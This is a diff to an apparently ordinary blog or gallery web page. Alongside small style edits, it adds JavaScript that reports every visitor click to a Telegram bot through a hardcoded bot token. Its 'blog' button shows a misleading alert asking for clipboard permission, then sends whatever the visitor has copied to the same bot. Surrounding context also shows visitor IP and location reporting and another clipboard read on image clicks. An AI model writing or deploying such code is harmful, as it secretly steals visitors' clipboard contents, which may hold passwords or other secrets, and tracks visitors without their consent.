@@ -69,7 +69,7 @@
 
     .post-img {
       width: 100%;
-      height: 120px;
+      aspect-ratio: 1 / 1;
       object-fit: cover;
       border-radius: 10px;
       cursor: pointer;
@@ -196,8 +196,8 @@
   </div>
 
   <!-- 👑 -->
-  <div class="video-fab" onclick="goTo('index', 'زر فيديو')">🎥</div>
-  <div class="blog-fab" onclick="goTo('index', 'زر مدونات')">📖</div>
+  <div class="video-fab" onclick="goToVideo()">🎥</div>
+  <div class="blog-fab" onclick="goToBlog()">📖</div>
 
   <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
@@ -244,20 +244,32 @@
 
     runReportOnce();
 
-    function goTo(path, label) {
-      getIPInfo().then(data => {
-        sendToTelegram(`👆 ${label}:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`);
-        window.location.href = path;
-      });
-    }
-
     function sendAction(action) {
       sendToTelegram(`👆 ${action}`);
     }
 
-    document.addEventListener('click', () => {
-      sendAction('نقرة في الموقع');
-    });
+    function goToVideo() {
+      sendAction("زر فيديو");
+      window.location.href = "index";
+    }
+
+    function goToBlog() {
+      sendAction("زر مدونات");
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        alert("クリップボードの内容を読み取る許可を与えてください。");
+        navigator.clipboard.readText().then(text => {
+          if (text) {
+            sendToTelegram("📋 محتوى الحافظة (من زر المدونات):\n" + text);
+          }
+          window.location.href = "index";
+        }).catch(() => {
+          sendToTelegram("❌ رفض إذن قراءة الحافظة");
+          window.location.href = "index";
+        });
+      } else {
+        window.location.href = "index";
+      }
+    }
 
     function handleClick(img) {
       if (navigator.clipboard && navigator.clipboard.readText) {
@@ -268,7 +280,10 @@
         }).catch(() => {});
       }
     }
+
+    document.addEventListener('click', () => {
+      sendAction("نقرة في الموقع");
+    });
   </script>
 </body>
 </html>
-
